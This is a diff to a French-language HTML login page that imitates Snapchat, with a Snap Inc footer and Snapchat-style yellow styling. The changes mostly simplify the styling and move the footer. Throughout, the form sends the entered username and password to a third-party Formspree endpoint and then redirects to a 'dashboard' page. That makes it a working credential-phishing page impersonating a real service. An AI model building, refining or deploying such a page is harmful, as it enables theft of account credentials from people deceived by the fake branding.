@@ -13,9 +13,7 @@
       justify-content: center;
       height: 100vh;
       margin: 0;
-      flex-direction: column;
     }
-
     .login-box {
       background: #fff;
       padding: 30px;
@@ -23,14 +21,10 @@
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
       width: 300px;
       text-align: center;
-      position: relative;
-      z-index: 1;
     }
-
     h2 {
       margin-bottom: 20px;
     }
-
     input[type="text"], input[type="password"] {
       width: 100%;
       padding: 10px;
@@ -38,29 +32,6 @@
       border: 1px solid #ccc;
       border-radius: 5px;
     }
-
-    .password-container {
-      position: relative;
-    }
-
-    .toggle-password {
-      position: absolute;
-      top: 50%;
-      right: 10px;
-      transform: translateY(-50%);
-      cursor: pointer;
-      background: none;
-      border: none;
-      padding: 0;
-    }
-
-    .toggle-password svg {
-      width: 20px;
-      height: 20px;
-      fill: black;
-      pointer-events: none;
-    }
-
     button {
       width: 100%;
       padding: 10px;
@@ -70,31 +41,14 @@
       font-weight: bold;
       cursor: pointer;
     }
-
     button:hover {
       background-color: #fff200;
     }
-
-    .signup-btn {
-      margin-top: 10px;
-      background-color: #007bff;
-      color: white;
-    }
-
     .error-message {
       display: none;
       color: red;
       margin-top: 15px;
       font-size: 0.95em;
-    }
-
-    footer {
-      margin-top: auto;
-      width: 100%;
-      text-align: center;
-      font-size: 0.8em;
-      color: #888;
-      padding: 15px 0;
     }
   </style>
 </head>
@@ -106,37 +60,15 @@
 
   <form id="loginForm" action="https://formspree.io/f/xzzrqevd" method="POST">
     <input type="text" name="identifiant" placeholder="Nom d'utilisateur ou email" required>
-
-    <div class="password-container">
-      <input type="password" id="passwordInput" name="code" placeholder="Mot de passe" required>
-      <button type="button" class="toggle-password" onclick="togglePassword()" aria-label="Afficher le mot de passe">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-          <path d="M12 5c-7.633 0-11 7-11 7s3.367 7 11 7 11-7 11-7-3.367-7-11-7zm0
-          12c-2.761 0-5-2.239-5-5s2.239-5
-          5-5 5 2.239 5 5-2.239 5-5
-          5zm0-8c-1.654 0-3 1.346-3
-          3s1.346 3 3 3 3-1.346 3-3-1.346-3-3-3z"/>
-        </svg>
-      </button>
-    </div>
-
+    <input type="password" name="code" placeholder="Mot de passe" required>
     <button type="submit">Se connecter</button>
-    <button type="button" class="signup-btn">S'inscrire</button>
+    <button type="button" style="margin-top: 10px; background-color: #007bff; color: white;">S'inscrire</button>
   </form>
 
   <p id="errorMsg" class="error-message">Une erreur est survenue. Veuillez réessayer plus tard.</p>
 </div>
 
-<footer>
-  Société · Snap Inc · Carrières · Confidentialité · Conditions · Support · Marques · Découvrir · Publicité · Contacts
-</footer>
-
 <script>
-  function togglePassword() {
-    const input = document.getElementById("passwordInput");
-    input.type = input.type === "password" ? "text" : "password";
-  }
-
   document.getElementById("loginForm").addEventListener("submit", function(e) {
     e.preventDefault();
 
@@ -151,7 +83,8 @@
       }
     }).then(response => {
       if (response.ok) {
-        window.location.href = "dashboard.html"; // redirige vers la page 2
+        // Redirection dans le même onglet
+        window.location.href = "dashboard.html";
       } else {
         document.getElementById("errorMsg").style.display = "block";
       }
@@ -160,6 +93,18 @@
     });
   });
 </script>
+
+<footer style="
+  position: absolute;
+  bottom: 0;
+  width: 100%;
+  padding: 15px 0;
+  text-align: center;
+  font-size: 0.8em;
+  color: #888;
+">
+  Société · Snap Inc · Carrières · Confidentialité · Conditions · Support · Marques · Découvrir · Publicité · Contacts
+</footer>
 
 </body>
 </html>
